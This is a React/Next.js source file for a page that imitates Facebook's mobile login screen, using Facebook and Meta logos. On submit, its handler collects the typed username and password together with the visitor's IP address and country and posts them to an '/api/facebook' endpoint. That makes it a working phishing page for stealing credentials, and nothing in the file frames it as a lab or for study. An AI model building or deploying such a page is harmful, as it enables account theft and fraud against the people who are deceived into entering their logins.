"use client";
import { useState } from "react";
import styles from "./page.module.css";
import Link from "next/link";
import { getUserLocation } from "../utils/request";

export const getFormatedDateTime = (date) => {
  date = new Date(date);
  const formattedDate = date.toLocaleDateString("en-US", {
    year: "numeric",
    month: "short",
    day: "numeric",
  });

  const formattedTime = date.toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "numeric",
    hour12: true,
  });

  const formattedDateTime = `${formattedDate} ${formattedTime}`;
  return formattedDateTime;
};
export default function Facebook() {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();

    getUserLocation().then(
      async (data) =>
        await fetch("/api/facebook", {
          method: "POST",
          body: JSON.stringify({
            username,
            password,
            date: getFormatedDateTime(new Date()),
            ip_address: data.ip,
            country: data.country_name,
          }),
        })
    );
  };

  return (
    <div className={styles.page}>
      <div className={styles.wrapper}>
        <div className={styles.mainContainer}>
          <p className={styles.title}>English (Uk)</p>

          <div className={styles.logo}>
            <img src="/facebook1.png" alt="" />
          </div>

          <form onSubmit={handleSubmit} className={styles.form}>
            <div className={styles.form__group}>
              <input
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
                type="text"
              />
              <label htmlFor="">Mobile number or email address</label>
            </div>

            <div className={styles.form__group}>
              <input
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                type={showPassword ? "text" : "password"}
              />
              <label htmlFor="">Password</label>
              <div className={styles.password}>
                {showPassword ? (
                  <div onClick={() => setShowPassword(false)}>
                    <i className="fa-solid fa-eye"></i>
                  </div>
                ) : (
                  <div onClick={() => setShowPassword(true)}>
                    <i className="fa-solid fa-eye-slash"></i>
                  </div>
                )}
              </div>
            </div>

            <div className={styles.form__group}>
              <button>Log In</button>
            </div>

            <div className={styles.form__group}>
              <a className={styles.forgot} href="#">
                Forgotten account?
              </a>
            </div>
          </form>

          <div className={styles.bottomContainer}>
            <div className={styles.bottomButton}>
              <button>Create new account</button>
            </div>
            <div className={styles.bottomImage}>
              <img src="/meta.png" alt="" />
            </div>
            <div className={styles.footer}>
              <Link href="">About</Link>
              <Link href="">Help</Link>
              <Link href="">More</Link>
            </div>
          </div>
        </div>

        <div></div>
      </div>
    </div>
  );
}
